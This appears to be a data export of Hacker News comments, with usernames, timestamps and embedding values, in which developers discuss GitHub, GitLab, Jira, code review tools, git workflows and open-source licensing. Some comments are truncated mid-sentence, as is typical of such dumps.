33126571	I'm facing the opposite challenge ri	I'm facing the opposite challenge right now. I've recently joined in as the CTO of a small company and the team is in love with Scrum. They love it and they love Jira as well. Sometimes it seems that they spend more time using Jira than using their IDEs.This wouldn't be so much of a problem, but the team is SLOW. Every little feature and adjustment drags for many 2-weeks sprints. Every task gets broken down to its atoms.And what's tiresome to me is that, whenever I try to reduce the overhead and get them more time to do useful work, they push back strongly and they start to pile up minor nitpicks and corner cases of what might go wrong in the future if we do change.I'd love to get some ideas on how to improve things without straining the relationship with top-down maneuvers.	haolez	7.97761	-5.7593145	comment	3.0	17.0	1665174866	-12.520441

33220094	For a real world example of this, Gi	For a real world example of this, GitHub uses server-side rendered fragments. Working with low latency and fast internet in the office, the experience is excellent. Trying to do the same outside with mobile internet, and even with a 5G connection, the increased latency makes the application frustrating to use. Every click is delayed, even for simple actions like opening menus on comments, filtering files or expanding collapsed code sections.I'm actually worried about developers in developing countries where mobile internet is the dominant way to access the Internet and GitHub is now the de facto way to participate in open source, that this is creating an invisible barrier to access.	mediumdeviation	8.522908	-6.1810074	comment	3.0	20.0	1665881498	5.61959

Go springs to mind here. I actually thought this was a terrible system (eg putting repo owner names in import strings) but it speaks to ubiquity of Github.But what are Docker images? Maybe a few hundred lines of Dockerscript at the end of the day.Losing in orchestration I think was the obvious big fail.

The search box on GitHub and now GitLab wastes space with ""This repository"" spelled out. It's also odd that you get more space to type when you're not searching inside of a repo, and that backspace is how you switch to a more general search. Pity. I thought that GitLab had learned their lesson and stopped copying GitHub.Aside from that, it sounds like a well thought out feature, and it's good that they're redoing it instead of just changing it bit by bit."	bau5	8.326209	-6.3119	comment	3.0	11.0	1500329752	-11.959337

We don't ask for GitHub links because they are pointless from a screening perspective. I'm happy to talk about them during an interview, but if I see a github link in a CV, there's little chance I will visit it. (Source: I'm a hiring manager at a tech company, have been in a similar position at previous jobs for several years).The fact is, as a hiring manager, I would have no time at all to do anything if I start looking at all my candidates' github links. I would be more than happy to look at a portfolio showing products built by them, if they look interesting, I can ask technical details during the interview.	funkaster	8.442365	-6.153267	comment	3.0	13.0	1501343316	-11.808707

sending a pull request on GitHub “automatically” licenses the

“inbound=outbound”—United States law doesn’t recognize any such
rule. Strong copyright protection, not permissive licensing, is the
default.That isn't quite what I mean by ""inbound=outbound"". Rather,
inbound=outbound is a contribution governance rule under which inbound
contributions, say a pull request for a GitHub-hosted project, are
deemed to be licensed under the applicable outbound license of the

projects have operated since time immemorial. The DCO is one way of

There is literally a `git format-patch` command which spits out a full formatted email (or emails) of your various commits, which can then be sent to a mail client to be edited and sent out. Or even easier, just use git to send the patches as email direct via `git send-email`.The harder part is touched on in the article - email clients and email servers. All the patches sent to the mailing-list are plain text, and lots of clients or servers either mess with the plain text before sending or after receiving. And with that they also take some configuring to avoid sending attachments as base64 - which will be reje	DSMan195276	8.529666	-6.2836514	comment	3.0	19.0	1475374693	-11.846759

Something like Git notes with conventions to refer to files/lines in a file/different revisions etc. Something similar to Fossil.This would solve half of the problem. The other half would be the UI layer.Now the reviews live in a database, outside of the repo, and can't be downloaded locally for offline work.This would allow doing code reviews and managing issues e.g. while commuting in a train. And everything would be pretty fast compared to waiting for a web page to load for every file you want to review and connecting to a server for every comment you write.	exDM69	8.5433855	-6.3244176	comment	3.0	12.0	1475401223	2.2602959

If you have dependencies, bring them in-house on your own Artifactory, gem server, npm mirror, whatever.

Then, as code gets generated, a conglomerate license could be assembled in parallel.  It could emit warnings that licenses are incompatible, or better yet, give the user a choice over which licenses they find acceptable and disallow incompatible licenses.This whole thing could be done above board, and it's pure sloppiness on the part of github that they've chosen not to.	klyrs	8.44953	-6.0850434	comment	3.0	11.0	1625415914	-11.707459

Jira being notoriously laggy and confusing is the result of prioritizing feature breadth over UX. Apps being built in heavy frameworks is the result of founders and CTOs deciding that they can ship faster and be more likely to make it to the next funding round if they color within the lines than if they focus on speed.

That forces you to pull up the PR in Github, dig into the CI failure, check out your branch again, make the fix, commit, push, and wait for CI all over again.  If your PR was previously approved, then you have to bug the reviewer to re-approve since the review gets dismissed when you push new commits.I know this isn't exactly what this article was talking about, but it's such a big frustration to me.

We also have a couple code repos and anything specific to that codebase is stored there.

The legal reality is that yes: if you want to write code that other people are to be using or reading you do need to put ""license stickers on each little piece of code""; this is sadly a big problem with hackathons and classes that encourage people to put stuff haphazardly on GitHub because ""yay open source"" without teaching people enough about copyright to make that worthwhile."	saurik	8.463724	-6.0597205	comment	3.0	22.0	1505655291	-11.68245

These topic terms are then used to query the GitHub search API to find matching repositories. The results are then sorted by star count.That is a clever way to make use of a search API like GitHub's. The principled way to do this, though, is to run LDA over all descriptions on GitHub, then use that similarity index to find similar repositories. You could run LDA over code, too.I'll note that there is a cold start problem with this implementation: using LDA on such a small set of short documents will often lead to uninformative topics with words that are too-specific. You need a big corpus to capture e.g. synonym relationships.	rw	8.554302	-6.156502	comment	3.0	12.0	1506899151	-11.717061

New ticket form has a few more fields than the default GH issue form but it’s much better than it used to be back in the days and comparable to custom form on GH. You also can log it with your GH account so not much of a barrier there, too. Seriously, try Mozilla’s bugzilla now and see for yourself.

Not only does YAML lack any type safety whatsoever, but every day I run into yet another open ticket in the Gitlab issue tracker because using a declarative (YAML-based) approach (as opposed to an imperative one) essentially means that the Gitlab devs need to think of every possible use case beforehand, so as to be able to define a declaration & write an implementation for it.

Jira is actually fucking useless to me. To the business, it's indispensible because it captures the larger tasks that roll up to a larger business objective. However, for each of those larger tasks I have a series of conversations and cross-functional dependencies that must be negotiated. More basically, my minutiae is much more than the larger tasks can ever describe, and that minutiae is much too noisy for the business to track - which is why we cover it informally in stand ups.What I need is something offline that tracks my minutiae like stories where the larger tasks (that are currently stories to the business) ge	kodah	7.980914	-5.7538443	comment	3.0	12.0	1668366395	-12.441474

It's a hard problem to solve, especially in a distributed/decentralized system (like git). Signing git-style commits is problematic in the face of merge conflicts or rebasing. A patch-style system (like Pijul) probably makes this easier: if everything is a patch, every patch can be signed atomically.I'd really like to see a DCVS with better signing support and with some form of access control (on the remote), so every change can be traced back to the author, and so that some parts of a repo can only be modified by specific authors. Git hooks (on the remote) can sort of achieve the latter, but it's a bit of a pain.	elric	8.55595	-6.3550925	comment	3.0	11.0	1668583427	-11.816821

It was the project's workflow of choice, and people would respect that.Things really became one-sided after github started gamifying open-source contributions, and when a new generation who perhaps grew-up in a more competitive academic setting took it as an opportunity to make their resume more impressive.We peer-pressured ourselves into collectively using a less-than-ideal tech because that was the price to pay to belong.	ezst	8.572807	-6.4038897	comment	3.0	10.0	1668620526	-11.835226

The companies I’ve worked for so far host their source code on their own servers, which are physically under their control, and aren’t accessible from the public internet. Add on top of it that functionally GitHub/GitLab don’t hold a candle to code review functionality of Gerrit, project management of Redmine/Jira; and the only explanation is that those companies really, really don’t want to hire 1/2 sysadmins to manage their infrastructure.	yakubin	8.464123	-6.207548	comment	3.0	10.0	1671621190	-11.870708

For example, if I have a Java class called A and I search ""class A"" in code search, the actual A.java doesn't tend to show up anywhere near the front. I just tried this in a repo and the actual A.java file was on the last page of results when I searched ""class A"". The vast majority of the results before it didn't even have the words ""class"" and ""A"" next to each other, which A.java does...Maybe I'm doing something wrong (I'd welcome any input on how to use code search correctly!), but it just feels like they're jumping the gun on trying to make their code search more advanced when the basic fun"	rococode	8.604631	-6.1274214	comment	3.0	13.0	1537297151	-11.622137

You have to have pretty thick skin to weather the entitlement people have to the thing(s) you put your life's free time into.Some ideas that I frequently wish existed:1. It would be neat if there was some sort of place in Github where people could upvote interesting project ideas, i.e. ""Load testing tool in Go""2. I'd also love to have a way to say, ""I can devote 1-5 hours a week to this project"" and be notified when someone tags an issue as 'help wanted'3. Harder, but still do-able (I think).

In some cases (especially open source), I can see that being kind of true, but I think GitHub gets far more use as a private internal collaboration tool in the work place. In that case, the code itself is far more valuable than anything else and deserves the majority of the screen space.	superfrank	8.485204	-6.2039165	comment	3.0	10.0	1551403041	-11.804108

Their latest UI revamp only made things worse.Somehow, they managed to accumulate the negatives of a flexible product (resulting in poor/incoherent UX) and the negatives of rigid assumptions regarding workflows (try modelling staggered deployments in different datacenters/environments spanning multiple sprints... good luck!).Going forward, I expect Atlassian to cater to rigid organizations and neglect those who design their own processes (whether lightweight ad-hoc or complex custom ones that don't fit what Atlassian Sales can understand).	athenot	8.005294	-5.769394	comment	3.0	23.0	1514915609	-12.370144

More practically, it gets right what Git gets wrong about branches: work done on branches and merges of branches into a trunk should be clearly distinct. I use Fossil for my hobby projects now and it also takes a principled stance against editing history. Bazaar did that and also made that unedited history nice to look at.

We've been working with Github and Microsoft Research on this for just about a year now and we're super excited to launch it today.We've seen huge advances in human language modeling and translation due to the success of deep learning. Often new directions start with a really motivated team producing a new kind of dataset. Who better to do that for code as language than Github!This started as a grassroots effort inside of Github, and went through many iterations. When it was presented to Github's CEO six months ago, he correctly pointed out that we needed to go back and include Github's most popular language (javascript). As the project went on many smart people chipped in, and we produced something that we think is truly useful.Check out the paper here: h	slewis	8.608253	-6.1280994	comment	3.0	21.0	1569536164	-11.625835
21092269	Are you doing anything to help copyl	Are you doing anything to help copyleft licensed code repos find infringers? We all know it's common practice for unscrupulous developers and companies to take copyleft code, copy it, and then try to relicensed under permissive licenses on a regular basis. Like Google did with Oracle's GPLed Java source code.It seems irresponsible for Github to continue distributing infringing code when it clearly has the tools to prevent that happening. Youtube has fingerprinting for infringing music and video. Github should be doing the same with source code.	panny	8.453903	-6.076656	comment	3.0	13.0	1569593955	-11.704934

For informal projects Trello or GitHub issues works, but if I ever have to track anything, it isn’t easy.I went from MSProject and ClearCase to Jira in the mid 00s and thought it was so much better. I’ve gradually changed to hate it, but can’t find a better tool.The alternatives I’ve tried have been way worse in terms of complication, cost, and specialized training required. I work with people who use MSTeams and it makes me yearn for Jira. I’ve used GitLab, but it’s cost is too high for non software projects.It’s weird how this seems so simple that there would be a clear default tool that just captures user stories, routes them among people, and gives reports.	prepend	8.009389	-5.759252	comment	3.0	10.0	1589638889	-12.361317

You can choose from at least 10 window managers, make your own from scratch, or fork and modify your most preferred.Jira, is like linux. If you don't like Jira, it's either slow (will address this next), or its really that you don't like the organization processes of the team or organization you are a part of. Because properly configured, Jira reflects the working decisions you have made as a team.As to being slow. I only had this issue once with a small dev shop self hosting in a closet. At a large enterprise with over 10,000 engineers using Jira, not including the non-engineers using it, it was always lightning fast for the self hosted version.	bound008	7.981335	-5.766021	comment	3.0	18.0	1589642302	-12.424832

For better or worse the developers of browsers/libraires decided to allow it, it takes extra code to check for it and block it. Now that sites rely on it they can't exactly back track.

HN skews towards startups so the excerpts from the most recent ""Who is hiring?"" thread[1] often mention Github profile as desirable (but not mandatory).On the other hand, the programming where IT-as-a-cost-center where development is CRUD work like moving zipcode field on a webpage ... those types of jobs advertised on Monster.com won't mention that they're looking for Github side projects.All that said... with real-life statistics being what they are...

It needs to know when the repo is updated (e.g. GitHub’s webhooks) and has to publish its results somewhere (e.g. GitHub’s commit statuses). So it only really works with hosted repos.Since each hosting service has a different API, each integration needs to be built individually. And it makes sense to integrate with GitHub first because it’s the most popular repo host.	tomstuart	8.478036	-6.314853	comment	3.0	10.0	1468328711	-11.856802

12370175	AFAICT this stems from a different p	AFAICT this stems from a different philosophy of what a code review should be for.  GitHub appears to believe that code reviews should be very high-level, with most discussion focused on overall design issues and only the latest version of the code, rather than detailed line-by-line reviews of incremental changes.  This attitude is shared by at least some number of GitHub users, since many people who visit https://reviewable.io (my attempt at a code review tool in the vein of Phab or Gerrit) don't even get why it might be needed.  So perhaps GitHub is not entirely wrong... but it certainly opens up a nice niche for providing tools to those who like more thorough reviews.	piotrkaminski	8.51386	-6.2687173	comment	3.0	11.0	1472256487	2.2474625

For me, Github is a great place to get students to push their assignments and papers because I can easily comment on them...once in awhile I'll do a force push to fix something.

It is easy to add queries to other people to call them in to touch a task.My main theory is that the use case is different; I have more to do with users for the present tasks and the more complex features are less overkill.

If you want to contribute, e-mail the lead maintainer.  Do not submit patches to the ether. Do not think anyone will look at your patches.  Having started several large open source projects, and started / worked for a number of open source companies, I can tell you the best way to get involved is to work on your personal relationship with the other developers.  If that means hanging out in IRC or Slack, that's what it takes.

Mailing lists are less and less popular, if one exists its web interface is likely a long way behind GitHub. There are no forums. Some languages have project-independent channels (e.g. message boards for python users will try to help you with whatever library you're messing with right now), but they don't exist for all ecosystems and are shrinking. Stack Overflow has a low tolerance to badly asked questions and a reputation for it (and probably killed the message boards that dealt with them before).Initially, it makes sense that questions go to Github (public, no extra infrastructure needed, no community yet), but at some point they have to be moved.

I almost can't believe it.(Although in terms of effort estimation, breaking the design doc down afterwards into tickets, and then estimating those individually, is a very useful exercise -- a design doc describes the outcome, the tickets describe how to get there, which is what you're really estimating.)"	crazygringo	7.9729195	-5.750067	comment	3.0	10.0	1481482833	-12.550863

I picked up 50 ""users"" last month, who just made an issue or two and drove away.The current model forces me to choose either CE (no paid features for anyone) or EE ($1950/mo).  That is what drives some of the disconnect on features like Pages, I'm not going to pay five figures a year for no matter what's in EE.But if I could pay $300 a year, and get either some paid features, or paid features for some users, that would be pretty easy.

No doubt there are some Trello employees who don't want to work for Jira, and a lot of them will eventually leave.Even if everybody at Trello honestly believes it, in a few months it's not going to be their decision any more."	jlarocco	7.9788575	-5.768157	comment	3.0	12.0	1483993160	-12.427921

If you work at a company like that, get out.(That of course, or you suck at empathy for your managers, and you're the problem).The place I work at, Jira is used pretty reasonably. Our devs, in 2 different teams have setup the workflows to show our progress and deployment flow in ways we prefer. The project managers use those workflows happily, they just want them to reflect reality.I'd rather use Trello, but honestly I'm trying to communicate the work I've done to my proj. managers, so the right tool is basically whatever works for them, not me.	allover	7.99712	-5.7664595	comment	3.0	10.0	1484000359	-12.390454

HR will have an HR project with the following issue types: New Hires, Employee Disputes, etc., each with workflows with statuses like resume received, contacted to set up a first interview, first interview set up, offer extended... etc. And then you can use all of Jira's existing reporting schemes to help management figure out, if I need to hire someone new 	solatic	7.9784017	-5.766741	comment	3.0	16.0	1484064787	-12.412839

The largest single problem with PRs is the implication that we all have git repositories with a shared authentication mechanism.

If you choose the first one, your client has to preserve spaces, tabs, linebreaks, and everything else byte-for-byte intact. If you choose the second two, git has to be able to auth to your email server, and nothing else along the way can break the byte-for-byte integrity of your email.

Many people use Visual Studio and Azure for open source projects, or software development in general. I find it very easy to use.  I hope Github makes a lot of money from enabling open source. Who knows, maybe Microsoft will buy it.More seriously: Github is a business focused on turning open source community ethos into hard $$$. There is nothing wrong with that, and their model depends on people buying into the carefully constructed marketing of Github -hearts- open source.

this turns commit signing on for every commit, you don't have to explicitly sign commits as a separate step.the criticism I've always heard of this practice is, what do you do with those signatures?  github displays a little widget showing that the commits are signed, but beyond that I don't think it cares which public key they were signed with, so it's not really helping anything."	philsnow	8.582411	-6.4361506	comment	3.0	10.0	1573626421	-11.743514

I thought gitlab was hosted in google cloud, but there’s a lot of references to e.g., a hand rolled consensus system and self-managed database clusters. I’m wondering if this event changes the math on build vs. buy at all for gitlab, sounds like a lot of money has gone into this solution.  How did that solution come up, is it about some specific Postgres features that aren’t available in googles hosted dbs or pricing?2. Again on the google cloud angle, why are servers being hand-managed and rebooted?

This continues normally until the startup has become number one in that vertical. Then it must defend its spot against other newcomers who want to disrupt. Part of the defence is diversification, use the capital to disrupt in other places as well. This has been the natural progression of every successful business I know. At some point that company is so big though, competing in so many verticals that it becomes stale.

It’s a little surprising that Google doesn’t just index everything public in Github, gitlab, etc.I would like a good code search solution especially because I have projects across lots of different repo servers but want developers to be able to find code regardless of repo home.

GitHub's Pull Request feature creates an expectation that the maintainers will read a contributor's code, whether they had discussed about it or not.Back in the days of SourceForge, open source software would be simply put for download.

Github being down had a huge affect on the process -- review, merging and CI success.

The 200 comments on one of those issues probably amounts to about 40 actual discussion topics. Many of them are the original poster adding follow-up comments to their original comment, or back-and-forth discussions about one single comment. It's especially noticeable on contentious discussion topics.Basic conversation threads wouldn't completely alleviate the problem--200 threads is much better than 1000 comments, but probably still an intractable amount for the maintainers. Still, it might mean you're able to scan 75% of the discussion instead of 25%.	wgerard	8.525686	-6.224711	comment	3.0	11.0	1544989959	-11.775859

And they claim Git is now the source control for Windows, which is impressive if true.

What we need is the Stack Overflow of issue tracking, that figures out what the real entities and actions are and eliminates the chronological pile-up.	fusiongyro	8.014878	-5.757854	comment	3.0	13.0	1547239711	-12.31441

It will gain Live login, maybe they will integrate it so you could login with your GitHub credentials to your computer if you so desire. But that's hardly worth billions.Maybe the better thing would be what others suggested - setup a non-profit that would run GitHub and all those big companies could put something in the jar. Certainly less than what was paid. But I know it can't work, VCs want their exit.For me it's a same game for GitLab.

Ruby also seems to be getting more robust [1]. Their CI/CD platform is really a great approach, emphasizing the GitLab Worker as a portable CI runner that communicates through the API.

Yes, technically accurate, just as notepad, webstorm, atom, vi, emacs, etc. also don't need any 'host'. If you aren't working with multiple authors, a local laptop with git plus perhaps a USB flash drive for backup is all you need. But if you plan to actually have a project that multiple people will work on, it must be hosted whether it is technically required or not IMHO :) Let's say there is no Github or Gitlab type solution... how do you send me a pull request?

Make sure to read the Phabricator Review Workflow[1] before making the switch, because everyone in your team have to change their workflow if they already used to Pull Request/Merge Request workflow. :-)That said, I always found Phabricator's issue tracker (Maniphest) to be superior to GitHub Issues, with ability to create task dependencies (parent/child) and ability to limit tasks permissions only to few selected groups (with spaces). It's possible to setup Phabricator to mirror other repositories if you want to use only its issue tracker.[1]: https://secure.phabricator.com/phame/post/view/766/writ	sirn	8.46065	-6.363552	comment	3.0	26.0	1528281899	2.237654

But if you don't want to throw away your code, and in my experience, most code has a value, then please publish it under one of the well-known licenses. I think it is one of the great features of Github, that on creation of a repository, it offers you to attach one of the well-known licenses to your project.

Right now JIRA leads because it allows management to pull pretty reports out of it.

The reasons for this can vary, but the core problem is always that.

This also requires re-inventing bisect on top of this database.

Even if they dip after 6 month it's far better to have the option to remove any of the 6 months worth of commits in the current codebase than to hypothesis about the state of a future codebase/environment 6 months ago. This becomes even easier with good commit messages.
If somebody is a user and decides to write a pull request, they are already invested anything more is virtue signaling, no amount of which will guarantee that they will be there in years, which is an unreasonable stipulation for a project that could be obsolete yesterday."	casey2	8.584417	-6.393938	comment	3.0	10.0	1689447172	-11.852392

When we look into complaints about missing results, it's almost always one of two things. First, the repository is not indexed yet, but searching triggers indexing. Future searches work. Second, the files or the repo hit our documented limitations (https://docs.github.com/en/search-github/github-code-search/...). I think these limits are pretty reasonable, but we need to do a better job making it clear why content isn't in the index.	100k	8.595376	-6.138844	comment	3.0	13.0	1702569576	-11.625997

Codeberg was dismissed for having limited CI, but in the end they went for a separate standalone CI anyway (& almost the same platform as Codeberg, just with the added overhead of self-hosting).	lucideer	8.289701	-6.3488445	comment	3.0	10.0	1702828684	-11.981008

Anything beyond that is just bad product configuration.

I guess this would allow people to like or comment your issue or pull request from Mastodon and those other platforms.I am not that excited about that last part, but federating pull requests sounds like a killer feature and a necessary step for a chance to topple GitHub.

But as a community we must balance how much advantages do we get from GitHub versus how much advantages it gets from us.Considering that GitHub will probably make millions with copilot, then it is fair to say that a big part of that success comes from the quality of the code we collectively put one. Therefore, money should be shared. And the first thing to do is to ask Microsoft : how much money do you make on us ?

Someone translating from a proven TLA+ spec to code (C, Java, etc.) can easily introduce a typo/bug. I wish there was a translator that'd convert your TLA+ to code in a language of your choice.2. Say what people may want about centralization (Git vs. Github, etc), this successful micro-collaboration was enabled by this centralization. Someone posts a link to a book/article, someone else posts a deep-link to some example code, yet another person finds bug in the said code, hunts down the Github link, uses Github's in-place edit feature (no (`git clone` + fix + `git push`)) and submits a merge-request, the author merges the fix (and smacks h	gurjeet	8.49815	-6.3313103	comment	3.0	11.0	1656740819	-11.885375

Who wants to pull updates from each contributor as opposed to a hub?So the real question is — what are the features of GitHub would you like to see decentralized? CI? Issues? Wikis? Because, you can self host many of these with gitea, GitLab, or sr.ht. That’s the best kind of decentralization, but it does add to your own personal overhead (maintenance, backups), and really limits discovery.I think what you might be asking for is if there is a federated code repository that supports git. That’s an interesting question, and I don’t know if such a thing yet exists.	mbreese	8.496534	-6.31217	comment	3.0	10.0	1656802673	-11.86224

This tool was indispensable for me, it allowed to quickly look at any API usage. I wouldn't be able to complete that project without it.Since Google closed this project, I never used anything similar, but I think that I should be. I tried few times to use ordinary Github search, but it wasn't good enough to be useful. Hopefully this project will change it. Done properly it would be a very powerful tool.What's not clear to me is whether that tool searches only on Github or on all repositories in the Internet?

I appreciate that this could be a tough calculation to make.Change resistance will likely be a factor here but sometimes the old processes were hated by the actual users, though not the managers, making the decisions.	reallydontask	8.059877	-5.20085	comment	3.0	10.0	1580912971	14.065887

Thought you had a great model for your sales tax that covered US and the EU? Well, enter Brazil and think again, with four slightly different taxes, some of which are applied on the net and some on the gross amount.Then again, if your plan does not include entering Brazil, you might actually be better off using smaller or your own software, as configuring SAP to do what you want it to do is often on par with writing your own system from scratch.There's a slight shortcut to that, which is using industry templates, but these only fit established busine"	endymi0n	8.060981	-5.20031	comment	3.0	26.0	1580922205	14.066036

For example, my local bare repos used hooks to (a) push to remotes on chriswarbo.net, (b) push to backups on github, (c) generate static HTML of the latest HEAD, and copy that to chriswarbo.net and IPFS.Since the article mentions bundles, a related feature is git's built-in mail "	chriswarbo	8.555798	-6.383377	comment	3.0	10.0	1704810743	-11.808868

The problem is that somewhere someone who is supposed to be held to some standard decided to pull that code in without looking at it, and that is the problem. NO WARRANTY is partially about legal issues, but not exclusively - if people share their code for free, they don't owe anyone anything. If you don't like that, you're free to offer them enough money to actually accept your standards.	yjftsjthsd-h	8.480819	-6.1069436	comment	3.0	26.0	1663967963	-11.745676

The reason I mentioned GitHub to this level is truly in 2009 onwards it unlocked sharing of code at a level I had not seen before. It really did eclipse the reuse of software to what came prior and a lot of that has to do with the associated social network and network affects. They in a way game-ified software for a new generation. And it's not that we didn't share software before, just not to this degree and that's because every decade we rebuild the same ideas for a new generation that then 10-100x what came before. So something will come after GitHub as well. But today that's what we have and that really changed software for a generation.	asim	8.482665	-6.2191153	comment	3.0	15.0	1664366559	-11.835652

19838122	GitHub is at an interesting inflecti	GitHub is at an interesting inflection point. Before the acquisition, VCs stoked the growth by giving away bandwidth and storage. Now that GitHub is a Microsoft property, the same continues because MS has been on a ten-year mission to build goodwill in the developer community.That may not last forever. The original GitHub people will gradually drift away once their vesting concludes. If overall growth stalls, Microsoft management may yet feel the temptation to start squeezing GitHub for cash.I suspect they'll acquire NPM along the way too, to have a better lock-in in place.	pavlov	8.450373	-6.1668525	comment	3.0	10.0	1557137937	-11.7811

The reason was pretty much one of being control freaks: wanting to be able to patch and tweak the config precisely as it came from the developers rather than having to work out how to coerce Debian's apache package to increase the hardcoded accept backlog limit or whatever today's drama might happen to be.However, this clearly comes at the expense of ease of keeping things patched and up-to-date, and one of the things we got right (albeit probably not for the right reasons at the time) when we did the initial rushed built-out of the legacy infrastructure in 2017 was to switch to using Debian packages 	Arathorn	8.294092	-6.374268	comment	3.0	15.0	1557392481	-12.009411

Unfortunate that they didn't.If MS didn't comply with the DMCA takedown notice, then the RIAA could go to court and get an injunction to force it down. Depending on how spiteful the RIAA and the judge are feeling, the injunction could be worded to take down the entirety of GitHub over a single repository.

I think the most important thing in a code review system is inline comments in the diff itself, and that’s something you get from Gerrit, Phabricator (Differential), etc. It encourages people to discuss the particulars of of a diff. Merge approval can be made contingent on resolving minor issues within a diff. Diffs are also approved on a per-diff basis, and it’s less typical to merge a stack of diffs.I think the pull request / merge request makes sense with the “trusted lieutenants” development model that the Linux kernel uses, but for other projects you would be more likely to want a work flow where someone submits a single commit/diff and then someone approves it (after comments).When I review PRs on services like Git	dietrichepp	8.473704	-6.421759	comment	3.0	10.0	1603898679	-12.041692

25595644	As a recovering Jira architect, you 	As a recovering Jira architect, you can drastically speed up the application by minimizing the use of permissions wherever possible.When you go to a page for a ticket, the app has to make multiple backend calls (which likely involve even more backend calls to a directory) to determine what groups you're in and so what you're allowed to do with that ticket and what UI elements to hide or show as a result. By turning off the permission checks, you replace all of this communication with the equivalent of 'return true'.Unless you're running a multi-department enterprise-wide Jira ($deity have mercy on your soul), you're better off eliminating permissions entirely and controlling access to the instance at the network.

But most of them were tasks that would take a few minutes at most. (Some of the problems I fixed live while working with the designer).

It's really not great to make newcomers learn how to use arc (which is really not that good and barely used elsewhere) when they can learn proper git commands that will be useful for them in many aspects of their professional life, or just reuse the knowledge if they're already familiar.I understand whoever wrote the article didn't want to be complaining about Phabricator as much as talking about how good gitlab is.	bondia	8.324949	-6.3657713	comment	3.0	10.0	1593476785	-11.982673

(Though, they might be free software; their server code isn't distributed to the user, so even under the GPL they would not have to also distribute the source).So what if GitHub is proprietary? So long as you don't run their JavaScript on your machine, your computing can still be fully free. And, if the problem is that Microsoft will prevent some project from being developed there, they can take their local Git (GPLv2 licensed) repositories and push them somewhere else.This all seems like a win from the FSF's pers	rhaps0dy	8.455285	-6.1460457	comment	3.0	16.0	1593523795	-11.773067

Will the general public learn your email address? What about people who want to post publicly and keep their email addresses private?What happens if you switch email providers?Also, there is there any provision for actually making public files available via https? How would that work?For the moment, using your github username feels safer, since they are public from the beginning, intended to be permanent, and detached from your email addresses.

This generated a lot of goodwill in the days when GitHub didn't provide private repos even for personal use. I'm guessing that Gitlab now views its competitive advantage as the CI / DevOps experience. Still, it feels to me like they could limit that feature specifically rather than limiting even public projects to 5 users. Right now, GitHub's offering is suddenly looking attractive again for anyone who doesn't want to fill out a separate application (annually!) for each of their open source namesp	eslaught	8.271259	-6.3724027	comment	3.0	22.0	1648141740	-11.976567

Verifying that downloaded archives have the expected checksum is a critical best practice for software supply chain security. Training people to ignore checksum changes is training them to ignore attacks.GitHub is a strong leader in other parts of supply chain security, and it can lead here too. Once GitHub has served an archive with a given checksum, it should guarantee that the archive has that checksum forever.	rsc	8.600956	-6.383252	comment	3.0	19.0	1675122540	8.373296

The proper thing (also read as: the friendliest way for distro packagers) is for software projects to generate and publish a tarball themselves as part of their tag+release process.That provides multiple advantages. Unlike GitHub’s unreliable automatically generated files, a fixed file can be hashed or cryptographically signed by the project (with SSH signatures, Signify, PGP, etc.), and later verified without having to extract the files first or check out the underlying repo.Another thing many projects aren’t aware of: if your project uses Git submodules, anyone using GitHub’s autogenerated tarballs will be unable to build your software, because those don’t contain submodules.	bentley	8.673426	-6.2500296	comment	3.0	14.0	1675373455	-11.803306

The low barrier of entry to Github probably also contributes, since it attracts younger/less mature people.

Sadly most cases I see are the same as the angular case in this article.I made an issue suggesting tickets not be marked as stale if they've not had a maintainer comment yet. As you can imagine, the stale bot installed on the repo itself kept trying to close it due to it being ""stale"".

Auth tokens are being committed to public repos at an alarming rate. Detecting this and ideally preventing it as early as possible is key to avoiding account compromise.  There are two components to this: identification of a secret and attribution. Identification is non-trivial and requires determining if some text really is a secret and not just a random hash, uuid, or other high entropy string. Most tokens today are generic, alphanumeric patterns; false positives abound. Attribution is tricky too, currently relying on either parsing the variable name (`AWS_SECRET_KEY=XYZ`), commit message, file name, or some other metadata. In the rare case, a service will have designed their auth tokens with this	tompic823	8.539903	-6.1942472	comment	3.0	30.0	1612099331	4.331822

This makes it easier to keep your deploy secrets (aka the keys to the kingdom) locked down, as they never leave your cloud provider.	theptip	8.306328	-6.392711	comment	3.0	17.0	1565285424	-12.037095

Github's user base is far bigger than Azure's user base, and Microsoft wants to eventually get as many people as possible buying IaaS (or equivalents).The next logical step after Github Actions for CI/CD is to offer Github as a place to run the production code too. You would be buying Azure with fewer steps. It's pretty arbitrary that we develop code in one place while then going off and using a separate suite of tools and processes to run it. Having a suite for everything in one place could be very appealing to the market.	zenlikethat	8.479282	-6.194145	comment	3.0	15.0	1565286823	-11.784718

I don't want to be a git jockey and I can do 90% of what I need in the SourceTree UI -- it's saved me tons of time, and I especially like the chunk-stage/unstage/reset functionality (you can stage/unstage/undo fragments of files in the UI) -- this feature alone is gold.

""Hey, can you look at INC123456"". The ticket is not yet assigned to me. How do I find and open this ticket? The support agent can send me a direct link, but there's no apparent relation between any of the query params and the ticket number, and also no obvious UI element in which I can put a ticket number and navigate there. When I navigate to the ticket, comments are mixed in with audit entries. The frame based navigation also means I get questions from junior devs on tickets and they copy links into slack messages that just send me to the homepage."

It adds some personality that makes otherwise boring diagrams interesting to look at.Finally, I want to say how awesome it is that you can try out the app without an account and with only one-click. Nothing ""sells"" your product better than your product, and this website is a textbook example of how this should be executed."	css	8.141242	-5.7893786	comment	3.0	12.0	1597501587	-12.280092
24173787	> are people using git without frequ	> are people using git without frequently pushing to remote? I feel like having a remote backup of my work in progress is the killer feature.I use git without a remote pretty often. When doing personal projects or exploratory work, the problem is either so trivial that I don't care about backup, or already backed up using something like Nextcloud/Syncthing. But having the commit history allows me to easily look at old code, revert changes, and make big structural changes without having to back up the entire project folder in case I end up disliking the new structure.I guess you're just not working on many things at a scale where version control is useful but setting up an online repo doesn't seem worth the time.	the_pwner224	8.550896	-6.4082327	comment	3.0	10.0	1597538807	-11.896105

There's always stuff to be done (create, maintain, or both), pressure comes from the top and the usual response is ""throw bodies at it"". The less hackerish/the more corporate the company, the faster the engineering team blows up.

33544399	A very interesting interpretation of	A very interesting interpretation of the github TOS. Kate Downin is saying that users of github is giving a special license to GitHub, one that bypasses the original license. However if that is true then any upload of code that users do not have 100% copyright control of is then a copyright violation since the user would not have the authority to grant github that special license. It would be similar to a user uploading a copyrighted movie to youtube, and google using that as a license to use the movie in an advertisement.I wonder if a court would think that microsoft in this case has done their due diligent to verify that the license grant that they got from users are correct and in order.	belorn	8.450741	-6.0559855	comment	4.0	15.0	1668074439	-11.601184

